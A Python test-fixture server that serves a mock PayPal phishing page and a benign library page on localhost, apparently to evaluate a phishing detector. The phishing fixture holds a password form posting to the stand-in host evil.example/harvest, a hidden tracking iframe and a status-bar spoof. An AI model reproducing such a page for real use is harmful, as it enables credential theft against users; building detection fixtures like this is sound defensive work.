"""Controlled local HTTP fixture server for PhisX extension/API evaluation.

Phishing fixtures are served on 127.0.0.1 so the hostname is an IP (UCI having_IP).
Legitimate fixtures are served on the same port via localhost so the hostname is not an IP.
Both use HTTP, so SSLfinal_State is -1 for every local case and is held constant.
"""

from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

PHISH_HTML = """<!doctype html>
<html>
<head><title>Secure account update</title></head>
<body>
  <h1>PayPal security centre</h1>
  <p>Verify your identity to avoid suspension.</p>
  <iframe src="https://example.com/tracker" width="1" height="1"></iframe>
  <form action="https://evil.example/harvest" method="post">
    <input name="password" type="password">
    <a href="mailto:security@paypal-help.example">Contact support</a>
  </form>
  <script onmouseover="window.status='https://www.paypal.com'">
    document.addEventListener('contextmenu', e => e.preventDefault());
  </script>
  <a href="https://accounts.google.com">Google</a>
  <a href="https://login.microsoftonline.com">Microsoft</a>
  <a href="https://www.apple.com">Apple</a>
  <img src="https://cdn.example.net/pixel.gif">
</body>
</html>
"""

LEGIT_HTML = """<!doctype html>
<html>
<head><title>Campus library portal</title>
<link rel="icon" href="/favicon.ico">
</head>
<body>
  <h1>University library</h1>
  <p>Opening hours and catalogue search.</p>
  <a href="/about">About</a>
  <a href="/hours">Hours</a>
  <form action="/search" method="get">
    <input name="q">
  </form>
</body>
</html>
"""


class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        return

    def do_GET(self):
        path = urlparse(self.path).path
        if path.startswith("/phish/"):
            body = PHISH_HTML.encode()
        elif path.startswith("/legit/"):
            body = LEGIT_HTML.encode()
        elif path == "/favicon.ico":
            body = b""
        else:
            self.send_response(404)
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def make_server(host: str, port: int) -> ThreadingHTTPServer:
    return ThreadingHTTPServer((host, port), Handler)
